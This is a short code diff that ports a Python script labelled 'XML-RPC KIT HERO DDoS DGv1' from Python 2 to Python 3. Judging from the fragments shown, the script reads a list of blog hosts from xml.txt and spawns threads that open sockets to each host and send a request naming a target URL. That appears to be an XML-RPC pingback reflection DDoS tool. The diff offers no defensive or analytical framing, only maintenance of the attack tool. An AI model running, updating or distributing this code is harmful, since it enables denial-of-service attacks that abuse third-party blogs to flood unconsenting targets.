@@ -11,9 +11,9 @@ def main():
 		try:
 			in_file = open("xml.txt","r")
 		except:
-			raw_input('You need a list.txt file to work')
+			input('You need a xml.txt file to work')
 			sys.exit(0)
-		print '\tXML-RPC KIT HERO DDoS DGv1\n'
+		print('\tXML-RPC KIT HERO DDoS DGv1\n')
 		url = sys.argv[1]
 		num_thread = int(sys.argv[2])
 		if url.count("/")==2:
@@ -56,8 +56,8 @@ class Thread1(threading.Thread):
 					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
 					s.connect((self.blog_cleaned1, 80))
 					s.send(request)
-					print self.blog_cleaned1+" connect " + self.url
+					print(self.blog_cleaned1+" connect " + self.url)
 				except:
-					print 'Error'
+					print ('Error')
 					ok = 0
 main()
